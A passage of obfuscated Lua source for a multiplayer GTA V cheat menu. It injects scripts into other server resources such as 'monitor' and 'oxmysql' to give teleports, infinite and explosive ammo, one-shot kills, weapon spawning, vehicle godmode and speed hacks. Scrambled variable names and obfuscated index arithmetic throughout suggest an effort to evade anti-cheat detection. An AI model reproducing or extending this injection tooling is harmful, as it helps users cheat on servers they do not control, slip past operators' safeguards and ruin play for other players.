    ]]);end);MachoMenuButton(v34[1],"Mission Row PD",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function oypB9FcNwK()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 425.1, -979.5, 30.7
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        oypB9FcNwK()
    ]]);end);MachoMenuButton(v34[1 + 0 ],"Pillbox Hospital",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function TmXU0zLa4e()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 308.6, -595.3, 43.28
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        TmXU0zLa4e()
    ]]);end);MachoMenuButton(v34[1126 -(936 + 189) ],"Del Perro Pier",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function eLQN9XKwbJ()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -1632.87, -1007.81, 13.07
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        eLQN9XKwbJ()
    ]]);end);MachoMenuButton(v34[1],"Grove Street",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function YrAFvPMkqt()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 109.63, -1943.14, 20.80
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        YrAFvPMkqt()
    ]]);end);MachoMenuButton(v34[1],"Legion Square",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function zdVCXL8rjp()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 229.21, -871.61, 30.49
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        zdVCXL8rjp()
    ]]);end);MachoMenuButton(v34[1 + 0 ],"LS Customs",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function oKXpQUYwd5()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -365.4, -131.8, 37.7
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        oKXpQUYwd5()
    ]]);end);MachoMenuButton(v34[1614 -(1565 + 48) ],"Maze Bank",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function E1tYUMowqF()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -75.24, -818.95, 326.1
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        E1tYUMowqF()
    ]]);end);MachoMenuButton(v34[1],"Mirror Park",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function Ptn2qMBvYe()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 1039.2, -765.3, 57.9
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        Ptn2qMBvYe()
    ]]);end);MachoMenuButton(v34[1 + 0 ],"Vespucci Beach",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function gQZf7xYULe()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = -1223.8, -1516.6, 4.4
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        gQZf7xYULe()
    ]]);end);MachoMenuButton(v34[1139 -(782 + 356) ],"Vinewood",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function JqXLKbvR20()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 293.2, 180.5, 104.3
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        JqXLKbvR20()
    ]]);end);MachoMenuButton(v34[268 -(176 + 91) ],"Sandy Shores",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function NxvTpL3qWz()
            local aSdFgHjKlQwErTy = PlayerPedId
            local zXcVbNmQwErTyUi = IsPedInAnyVehicle
            local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
            local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

            local x, y, z = 1843.10, 3707.60, 33.52
            local ped = aSdFgHjKlQwErTy()
            local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
            xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
        end

        NxvTpL3qWz()
    ]]);end);MachoMenuButton(v34[2],"Print Current Coords",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        local function Xy9TqLzVmN()
            local zXcVbNmQwErTyUi = GetEntityCoords
            local aSdFgHjKlQwErTy = PlayerPedId

            local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
            local x, y, z = coords.x, coords.y, coords.z
            print(string.format("[^3JTG^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
        end

        Xy9TqLzVmN()
    ]]);end);MachoMenuCheckbox(v35[1],"Infinite Ammo",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
        LkJgFdSaQwErTy = true

        local function qUwKZopRM8()
            if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
            LkJgFdSaQwErTy = true

            local MnBvCxZlKjHgFd = CreateThread
            MnBvCxZlKjHgFd(function()
                local AsDfGhJkLzXcVb = PlayerPedId
                local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                local GhJkLzXcVbNmQw = SetPedAmmo

                while LkJgFdSaQwErTy and not Unloaded do
                    local ped = AsDfGhJkLzXcVb()
                    local weapon = ZxCvBnMqWeRtYu(ped)

                    QwErTyUiOpAsDf(ped, true)

                    if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                        GhJkLzXcVbNmQw(ped, weapon, 250)
                    end

                    Wait(0)
                end
            end)
        end

        qUwKZopRM8()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        LkJgFdSaQwErTy = false

        local function yFBN9pqXcL()
            local AsDfGhJkLzXcVb = PlayerPedId
            local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
            QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
        end

        yFBN9pqXcL()
    ]]);end);MachoMenuCheckbox(v35[1],"Explosive Ammo",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
        QzWxEdCvTrBnYu = true

        local function WpjLRqtm28()
            if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
            QzWxEdCvTrBnYu = true

            local UyJhNbGtFrVbCx = CreateThread
            UyJhNbGtFrVbCx(function()
                local HnBvFrTgYhUzKl = PlayerPedId
                local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                local JkLpHgTfCvXzQa = AddOwnedExplosion

                while QzWxEdCvTrBnYu and not Unloaded do
                    local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                    local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                    if XsWaQzEdCvTrBn then
                        JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                    end

                    Wait(0)
                end
            end)
        end

        WpjLRqtm28()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        QzWxEdCvTrBnYu = false
    ]]);end);MachoMenuCheckbox(v35[2 -1 ],"Oneshot Kill",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
        RfGtHyUjMiKoLp = true

        local function xUQp7AK0tv()
            local PlMnBvCxZaSdFg = CreateThread
            PlMnBvCxZaSdFg(function()
                local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                local ErTyUiOpAsDfGh = PlayerPedId

                while RfGtHyUjMiKoLp do
                    if Unloaded then
                        RfGtHyUjMiKoLp = false
                        break
                    end

                    local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                    if Wp and Wp ~= 0 then
                        AsDfGhJkLzXcVb(Wp, 1000.0)
                    end

                    Wait(0)
                end
            end)
        end

        xUQp7AK0tv()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        RfGtHyUjMiKoLp = false
        local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
        local AsDfGhJkLzXcVb = SetWeaponDamageModifier
        local ErTyUiOpAsDfGh = PlayerPedId
        local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
        if Wp and Wp ~= 0 then
            AsDfGhJkLzXcVb(Wp, 1.0)
        end
    ]]);end);local v46=MachoMenuGetInputbox(WeaponSpawnerBox);if (v46 and (v46~="")) then MachoInjectResource((v41("monitor") and "monitor") or "any" ,string.format([[
            local function GiveWeapon()
                local ped = PlayerPedId()
                local weapon = GetHashKey("%s")
                local XeCwVrBtNuMyLk = GiveWeaponToPed
                XeCwVrBtNuMyLk(ped, weapon, 250, true, true)
            end

            GiveWeapon()
        ]],v46));end local v47=0 -0 ;local v48={[0]={name="Default",hash="MP_F_Freemode"},[1]={name="Gangster",hash="Gang1H"},[1094 -(975 + 117) ]={name="Wild",hash="GangFemale"},[1878 -(157 + 1718) ]={name="Red Neck",hash="Hillbilly"}};MachoMenuDropDown(v35[3 + 0 ],"Aiming Style",function(v173) v47=v173;end,"Default","Gangster","Wild","Red Neck");MachoMenuButton(v35[10 -7 ],"Apply Aiming Style",function() local v174=v48[v47];if  not v174 then return;end MachoInjectResource((v41("oxmysql") and "oxmysql") or "any" ,([[
        local function vXK2dPLR07()
            local UiOpAsDfGhJkLz = PlayerPedId
            local PlMnBvCxZaSdFg = GetHashKey
            local QwErTyUiOpAsDf = SetWeaponAnimationOverride

            local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
            QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
        end

        vXK2dPLR07()

    ]]):format(v174.hash));end);MachoMenuCheckbox(v36[1],"Vehicle Godmode",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
        zXcVbNmQwErTyUi = true

        local function LWyZoXRbqK()
            local LkJhGfDsAzXcVb = CreateThread
            LkJhGfDsAzXcVb(function()
                while zXcVbNmQwErTyUi and not Unloaded do
                    local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                    local TyUiOpAsDfGhJkL = PlayerPedId
                    local AsDfGhJkLzXcVbN = SetEntityInvincible

                    local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                    if vehicle and vehicle ~= 0 then
                        AsDfGhJkLzXcVbN(vehicle, true)
                    end
                    Wait(0)
                end
            end)
        end

        LWyZoXRbqK()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        zXcVbNmQwErTyUi = false
        local QwErTyUiOpAsDfG = GetVehiclePedIsIn
        local TyUiOpAsDfGhJkL = PlayerPedId
        local AsDfGhJkLzXcVbN = SetEntityInvincible

        local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
        if vehicle and vehicle ~= 0 then
            AsDfGhJkLzXcVbN(vehicle, false)
        end
    ]]);end);MachoMenuCheckbox(v36[1],"Force Vehicle Engine",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
        GhYtReFdCxWaQzLp = true

        local function OpAsDfGhJkLzXcVb()
            local lMnbVcXzZaSdFg = CreateThread
            lMnbVcXzZaSdFg(function()
                local QwErTyUiOp         = _G.PlayerPedId
                local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                local En_g_Health_Get    = _G.GetVehicleEngineHealth
                local En_g_Health_Set    = _G.SetVehicleEngineHealth
                local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                local function _tick(vh)
                    if vh and vh ~= 0 then
                        No_Hotwire_Set(vh, false)
                        En_g_Degrade_Set(vh, false)
                        ErTyUiOpAsDfGh(vh, false)
                        KeEpOnAb(vh, true)

                        local eh = En_g_Health_Get(vh)
                        if (not eh) or eh < 300.0 then
                            En_g_Health_Set(vh, 900.0)
                        end

                        ZxCvBnMqWeRtYu(vh, true, true, true)
                    end
                end

                while GhYtReFdCxWaQzLp and not Unloaded do
                    local p  = QwErTyUiOp()

                    _tick(AsDfGhJkLz(p, false))
                    _tick(TyUiOpAsDfGh(p))
                    _tick(AsDfGhJkLz(p, true))

                    Wait(0)
                end
            end)
        end

        OpAsDfGhJkLzXcVb()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        GhYtReFdCxWaQzLp = false
        local v = GetVehiclePedIsIn(PlayerPedId(), false)
        if v and v ~= 0 then
            SetVehicleKeepEngineOnWhenAbandoned(v, false)
            SetVehicleEngineCanDegrade(v, true)
            SetVehicleUndriveable(v, false)
        end
    ]]);end);MachoMenuCheckbox(v36[1],"Vehicle Auto Repair",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
        PlAsQwErTyUiOp = true

        local function uPkqLXTm98()
            local QwErTyUiOpAsDf = CreateThread
            QwErTyUiOpAsDf(function()
                while PlAsQwErTyUiOp and not Unloaded do
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local LzXcVbNmQwErTy = GetVehiclePedIsIn
                    local VbNmLkJhGfDsAz = SetVehicleFixed
                    local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                    local ped = AsDfGhJkLzXcVb()
                    local vehicle = LzXcVbNmQwErTy(ped, false)
                    if vehicle and vehicle ~= 0 then
                        VbNmLkJhGfDsAz(vehicle)
                        MnBvCxZaSdFgHj(vehicle, 0.0)
                    end

                    Wait(0)
                end
            end)
        end

        uPkqLXTm98()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        PlAsQwErTyUiOp = false
    ]]);end);MachoMenuCheckbox(v36[3 -2 ],"Freeze Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
        LzKxWcVbNmQwErTy = true

        local function WkQ79ZyLpT()
            local tYhGtFrDeSwQaZx = CreateThread
            local xCvBnMqWeRtYuIo = PlayerPedId
            local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
            local gKdNqLpYxMiV = FreezeEntityPosition
            local jBtWxFhPoZuR = Wait

            tYhGtFrDeSwQaZx(function()
                while LzKxWcVbNmQwErTy and not Unloaded do
                    local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                    local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                    if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                        gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                    end
                    jBtWxFhPoZuR(0)
                end
            end)
        end

        WkQ79ZyLpT()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        LzKxWcVbNmQwErTy = false

        local function i7qWlBXtPo()
            local yUiOpAsDfGhJkLz = PlayerPedId
            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
            local FdSaPlMnBvCxZlK = FreezeEntityPosition

            local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
            local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
            if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
            end
        end

        i7qWlBXtPo()
    ]]);end);MachoMenuCheckbox(v36[1],"Vehicle Hop",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
        NuRqVxEyKiOlZm = true

        local function qPTnXLZKyb()
            local ZlXoKmVcJdBeTr = CreateThread
            ZlXoKmVcJdBeTr(function()
                while NuRqVxEyKiOlZm and not Unloaded do
                    local GvHnMzLoPqAxEs = PlayerPedId
                    local DwZaQsXcErDfGt = GetVehiclePedIsIn
                    local BtNhUrLsEkJmWq = IsDisabledControlPressed
                    local PlZoXvNyMcKwQi = ApplyForceToEntity

                    local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                    local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                    if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                        PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                    end

                    Wait(0)
                end
            end)
        end

        qPTnXLZKyb()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        NuRqVxEyKiOlZm = false
    ]]);end);MachoMenuCheckbox(v36[1019 -(697 + 321) ],"Rainbow Vehicle",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
        GxRpVuNzYiTq = true

        local function jqX7TvYzWq()
            local WvBnMpLsQzTx = GetGameTimer
            local VcZoPwLsEkRn = math.floor
            local DfHkLtQwAzCx = math.sin
            local PlJoQwErTgYs = CreateThread
            local MzLxVoKsUyNz = GetVehiclePedIsIn
            local EyUiNkOpLtRg = PlayerPedId
            local KxFwEmTrZpYq = DoesEntityExist
            local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
            local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

            local yGfTzLkRn = 1.0

            local function HrCvWbXuNz(freq)
                local color = {}
                local t = WvBnMpLsQzTx() / 1000
                color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                return color
            end

            PlJoQwErTgYs(function()
                while GxRpVuNzYiTq and not Unloaded do
                    local ped = EyUiNkOpLtRg()
                    local veh = MzLxVoKsUyNz(ped, false)
                    if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                        local rgb = HrCvWbXuNz(yGfTzLkRn)
                        UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                        BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                    end
                    Wait(0)
                end
            end)
        end

        jqX7TvYzWq()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        GxRpVuNzYiTq = false
    ]]);end);MachoMenuCheckbox(v36[2 -1 ],"Drift Mode (Hold Shift)",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
        MqTwErYuIoLp = true

        local function PlRtXqJm92()
            local XtFgDsQwAzLp = CreateThread
            local UiOpAsDfGhKl = PlayerPedId
            local JkHgFdSaPlMn = GetVehiclePedIsIn
            local WqErTyUiOpAs = IsControlPressed
            local AsZxCvBnMaSd = DoesEntityExist
            local KdJfGvBhNtMq = SetVehicleReduceGrip

            XtFgDsQwAzLp(function()
                while MqTwErYuIoLp and not Unloaded do
                    Wait(0)
                    local ped = UiOpAsDfGhKl()
                    local veh = JkHgFdSaPlMn(ped, false)
                    if veh ~= 0 and AsZxCvBnMaSd(veh) then
                        if WqErTyUiOpAs(0, 21) then
                            KdJfGvBhNtMq(veh, true)
                        else
                            KdJfGvBhNtMq(veh, false)
                        end
                    end
                end
            end)
        end

        PlRtXqJm92()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        MqTwErYuIoLp = false
        local ZtQwErTyUiOp = PlayerPedId
        local DfGhJkLzXcVb = GetVehiclePedIsIn
        local VbNmAsDfGhJk = DoesEntityExist
        local NlJkHgFdSaPl = SetVehicleReduceGrip

        local ped = ZtQwErTyUiOp()
        local veh = DfGhJkLzXcVb(ped, false)
        if veh ~= 0 and VbNmAsDfGhJk(veh) then
            NlJkHgFdSaPl(veh, false)
        end
    ]]);end);MachoMenuCheckbox(v36[1 -0 ],"Easy Handling",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
        NvGhJkLpOiUy = true

        local function KbZwVoYtLx()
            local BtGhYtUlOpLk = CreateThread
            local WeRtYuIoPlMn = PlayerPedId
            local TyUiOpAsDfGh = GetVehiclePedIsIn
            local UyTrBnMvCxZl = SetVehicleGravityAmount
            local PlMnBvCxZaSd = SetVehicleStrong

            BtGhYtUlOpLk(function()
                while NvGhJkLpOiUy and not Unloaded do
                    local ped = WeRtYuIoPlMn()
                    local veh = TyUiOpAsDfGh(ped, false)
                    if veh and veh ~= 0 then
                        UyTrBnMvCxZl(veh, 73.0)
                        PlMnBvCxZaSd(veh, true)
                    end
                    Wait(0)
                end

                local ped = WeRtYuIoPlMn()
                local veh = TyUiOpAsDfGh(ped, false)
                if veh and veh ~= 0 then
                    UyTrBnMvCxZl(veh, 9.8)
                    PlMnBvCxZaSd(veh, false)
                end
            end)
        end

        KbZwVoYtLx()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        NvGhJkLpOiUy = false
        local UyTrBnMvCxZl = SetVehicleGravityAmount
        local PlMnBvCxZaSd = SetVehicleStrong
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            UyTrBnMvCxZl(veh, 9.8)
            PlMnBvCxZaSd(veh, false)
        end
    ]]);end);MachoMenuCheckbox(v36[1],"Shift Boost",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
        QwErTyUiOpSh = true

        local function ZxCvBnMmLl()
            local aAaBbCcDdEe = CreateThread
            local fFfGgGgHhIi = Wait
            local jJkKlLmMnNo = PlayerPedId
            local pPqQrRsStTu = IsPedInAnyVehicle
            local vVwWxXyYzZa = GetVehiclePedIsIn
            local bBcCdDeEfFg = IsDisabledControlJustPressed
            local sSeEtTvVbBn = SetVehicleForwardSpeed

            aAaBbCcDdEe(function()
                while QwErTyUiOpSh and not Unloaded do
                    local _ped = jJkKlLmMnNo()
                    if pPqQrRsStTu(_ped, false) then
                        local _veh = vVwWxXyYzZa(_ped, false)
                        if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                            sSeEtTvVbBn(_veh, 150.0)
                        end
                    end
                    fFfGgGgHhIi(0)
                end
            end)
        end

        ZxCvBnMmLl()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        QwErTyUiOpSh = false
    ]]);end);MachoMenuCheckbox(v36[1],"Instant Breaks",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
        VkLpOiUyTrEq = true

        local function YgT7FrqXcN()
            local ZxSeRtYhUiOp = CreateThread
            local LkJhGfDsAzXv = PlayerPedId
            local PoLkJhBgVfCd = GetVehiclePedIsIn
            local ErTyUiOpAsDf = IsDisabledControlPressed
            local GtHyJuKoLpMi = IsPedInAnyVehicle
            local VbNmQwErTyUi = SetVehicleForwardSpeed

            ZxSeRtYhUiOp(function()
                while VkLpOiUyTrEq and not Unloaded do
                    local ped = LkJhGfDsAzXv()
                    local veh = PoLkJhBgVfCd(ped, false)
                    if veh and veh ~= 0 then
                        if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                            VbNmQwErTyUi(veh, 0.0)
                        end
                    end
                    Wait(0)
                end
            end)
        end

        YgT7FrqXcN()
    ]]);end,function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        VkLpOiUyTrEq = false
    ]]);end);MachoMenuCheckbox(v36[2 -1 ],"Unlimited Fuel",function() MachoInjectResource((v41("monitor") and "monitor") or (v41("oxmysql") and "oxmysql") or "any" ,[[
        if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
        BlNkJmLzXcVb = true

        local function LqWyXpR3tV()
            local TmPlKoMiJnBg = CreateThread
            local ZxCvBnMaSdFg = PlayerPedId
